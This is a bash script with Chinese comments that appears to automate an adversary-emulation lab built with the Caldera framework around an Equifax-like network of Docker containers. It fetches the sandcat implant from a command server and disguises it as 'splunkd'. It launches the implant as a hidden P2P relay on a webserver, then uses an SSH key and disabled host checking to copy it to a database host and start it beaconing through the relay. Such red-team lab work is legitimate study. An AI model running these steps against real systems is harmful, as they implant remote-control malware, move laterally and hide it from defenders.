#!/usr/bin/env bash
set -euo pipefail

# 校验环境变量
: "${CALDERA_API_KEY:?export CALDERA_API_KEY first}"

# ==========================================
# 变量定义
# ==========================================
WS="equifax-seg-webserver-1"
DB_IP="192.168.1.100"
WS_INT="192.168.1.2"
RELAY_GROUP="10.0.0.2"
DB_GROUP="192.168.1.100"
SERVER="http://host.docker.internal:8888"
KEY_OPT="-o StrictHostKeyChecking=no -i /opt/tomcat/.ssh/id_rsa"

# ==========================================
# 步骤 1: 部署 Webserver 上的 Relay 代理
# ==========================================
echo "[1/6] (re)deploy relay on webserver (with proxy_http extension)..."
docker exec "$WS" bash -lc "
  pkill -f splunkd 2>/dev/null || true
  sleep 1
  
  curl -s -X POST \
    -H 'file:sandcat.go' \
    -H 'platform:linux' \
    -H 'gocat-extensions:proxy_http' \
    '$SERVER/file/download' > /tmp/splunkd
    
  chmod +x /tmp/splunkd
  
  nohup /tmp/splunkd -server '$SERVER' -group '$RELAY_GROUP' -listenP2P >/tmp/sandcat.log 2>&1 </dev/null &
  echo 'relay-started'
"

# ==========================================
# 步骤 2: 获取 P2P 监听端口
# ==========================================
echo "[2/6] discover random P2P port from Caldera proxy_receivers..."
PORT=""
for i in $(seq 1 20); do
  PORT=$(curl -s -H "KEY: $CALDERA_API_KEY" http://localhost:8888/api/v2/agents | python3 -c "
import json, sys
ags = json.load(sys.stdin)
ps = [
    r.rsplit(':', 1)[1] 
    for a in ags 
    for r in a.get('proxy_receivers', {}).get('HTTP', []) 
    if '$WS_INT' in r
]
print(ps[0] if ps else '')
  ")
  
  [ -n "$PORT" ] && break
  sleep 2
done

[ -z "$PORT" ] && { 
  echo "ERROR: no P2P port advertised; check /tmp/sandcat.log on webserver"
  exit 1 
}
echo "    P2P port = $PORT"

# ==========================================
# 步骤 3: 复制二进制文件到 Database 容器
# ==========================================
echo "[3/6] scp binary to DB via SSH jumphost..."
docker exec "$WS" bash -lc "scp $KEY_OPT /tmp/splunkd database@$DB_IP:/tmp/splunkd"

# ==========================================
# 步骤 4: 启动 Database 代理（指向 Relay）
# ==========================================
echo "[4/6] start DB agent pointed at relay $WS_INT:$PORT..."
docker exec "$WS" bash -lc "
  ssh $KEY_OPT database@$DB_IP \"
    pkill -f splunkd 2>/dev/null || true
    sleep 1
    chmod +x /tmp/splunkd
    nohup /tmp/splunkd -server 'http://$WS_INT:$PORT' -group '$DB_GROUP' >/tmp/sandcat.log 2>&1 </dev/null &
    echo 'db-started'
  \"
"

# ==========================================
# 步骤 5: 等待代理上线
# ==========================================
echo "[5/6] wait for DB agent to beacon through relay..."
sleep 8

# ==========================================
# 步骤 6: 清理两组中的冗余旧 Agent 记录
# ==========================================
echo "[6/6] prune dead paws in the two relay groups (keeps newest per group; never touches other groups)..."
curl -s -H "KEY: $CALDERA_API_KEY" http://localhost:8888/api/v2/agents | python3 -c "
import json, sys
ags = [a for a in json.load(sys.stdin) if a.get('group') in ('$RELAY_GROUP', '$DB_GROUP')]
keep = {}
for a in ags:
    g = a['group']
    if g not in keep or a['last_seen'] > keep[g]['last_seen']:
        keep[g] = a
for a in ags:
    if a['paw'] != keep[a['group']]['paw']:
        print(a['paw'])
" | while read -r paw; do
echo -n "  delete dead $paw -> "
curl -s -o /dev/null -w "%{http_code}\n" -X DELETE -H "KEY: $CALDERA_API_KEY" "http://localhost:8888/api/v2/agents/$paw"
done

# ==========================================
# 最终验收：两组各应只剩一个活的 agent
# ==========================================
echo "=== final agents in relay groups ==="
curl -s -H "KEY: $CALDERA_API_KEY" http://localhost:8888/api/v2/agents | python3 -c "
import json, sys
for a in json.load(sys.stdin):
    if a.get('group') in ('$RELAY_GROUP', '$DB_GROUP'):
        print(a['paw'], a.get('group'), a['username'], a.get('last_seen'))
"

# ==========================================
# 用法：
#   export CALDERA_API_KEY=...
#   chmod +x equifax/redeploy_relay.sh
#   ./equifax/redeploy_relay.sh
# ==========================================